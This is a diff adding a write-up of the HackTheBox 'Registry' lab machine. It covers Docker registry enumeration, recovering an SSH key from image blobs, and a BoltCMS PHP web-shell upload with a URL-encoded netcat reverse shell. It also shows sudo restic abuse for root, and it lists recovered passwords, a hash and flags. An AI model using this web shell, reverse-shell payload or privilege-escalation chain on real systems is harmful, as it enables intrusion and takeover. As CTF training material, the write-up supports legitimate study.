@@ -1,0 +1,48 @@
+We have two ports open, 80 and 443. 
+From the SSL port we get docker.registry.htb, and a hint on the 80, that is using nginx. Adding it to /etc/hosts we got that we have a docker registry.
+Now, let's exploit 'docker.registry.htb/v2/'. Let' see al the repositories using '/v2/_catalog'. The only one that exists is bolt-image. 
+Acess it using '/v2/bolt-image/tags/list'. Here is only latest. Get the manifest '/v2/bolt-image/manifests/latest' than the file.
+We will take the first one, '/v2/bolt-image/blobs/sha256:302bfcb3f10c386a25a58913917257bd2fe772127e36645192fa35e4c6b3c66b'
+So let's analyze this one. Forensics skills :P We got a passphrase 
+Downloading all files, we see that 'sha256:2931a8b44e495489fdbe2bccd7232e99b182034206067a364553841a1f06f791' takes a while, so is a big file. Unziping it and apply strings we see that is huge. So let's print the output in file and anylize it! [ strings sha256:2931a8b44e495489fdbe2bccd7232e99b182034206067a364553841a1f06f791 > file.txt ] 
+We got the id_rsa ( /root/.ssh/id_rsa ). Now let's  login to the box.
+And we got the user. [ ssh -i id_rsa bolt@10.10.10.159 ]
+
+Heading to root.
+We find that we have a new service on the box, backup.registry.htb
+Let's see what's in it. And on the '/bolt' we got a BoltCMS app [ isn't that obvious? ]
+To login we have to acess '/bolt/bolt/'. We don't have the credentials. Looking at the /etc/ngnix/sites-enabled/01.registry.conf we got a link to a database.
+Cuting it we have that bolt@registry.htb is the administrator, on this can we also get its password.
+When you login you see that you have access to modify & upload files from the config directory. With that you can use the to get a reverse shell.
+> NOTE you are time limited. 
+First create a file that shell_exec() the get parametere.
+Modify the config file to accept the .php extension
+Go to registry.htb/bolt/files/name.php?e= and paste the reverse tcp
+Capture the request with burp
+URL encode the reverse tcp
+Start the listener on the MACHINE not on local. 
+Now you have the shell. [ '/bolt/files/exec.php?e=%72%6d%20%2f%74%6d%70%2f%66%3b%6d%6b%66%69%66%6f%20%2f%74%6d%70%2f%66%3b%63%61%74%20%2f%74%6d%70%2f%66%7c%2f%62%69%6e%2f%73%68%20%2d%69%20%32%3e%26%31%7c%6e%63%20%31%32%37%2e%30%2e%30%2e%31%20%39%30%39%30%20%3e%2f%74%6d%70%2f%66' ]
+We see that we have access to the restic backup without password. [ (root) NOPASSWD: /usr/bin/restic backup -r rest* ] 
+Start server locally [ rest-server --path ~/Documents/HackTheBox/Machines/Registry/backup --no-auth ]
+Start a proxy [ ssh -R 8000:127.0.0.1:8000 -i id_rsa bolt@10.10.10.159 ]
+Working it [ sudo /usr/bin/restic backup -r rest:http://localhost:8000/ /root ]
+And we got the root.
+
+Rooted.
+
+Users:
+-> GkOcz221Ftb3ugog ( ssh passphrase )
+-> bolt@registry.htb:strawberry ( BoltCMS )
+-> $2y$10$e.ChUytg9SrL7AsboF2bX.wWKQ1LkS5Fi3/Z0yYD86.P5E9cpY7PK:strawberry
+
+
+Flags:
+-> USER: ytc0ytdmnzywnzgxngi0zte0otm3ywzi
+-> ROOT: ntrkzgnkotaxyju0ntrinda4yzbkztgw 
+
+Interesting cmds:
+wget --http-user=admin --http-password=admin  -i blobs.txt --no-check-certificate
+
+Articles:
+-> https://blog.dixitaditya.com/exploiting-docker-registry/
+-> https://docs.docker.com/registry/spec/api/
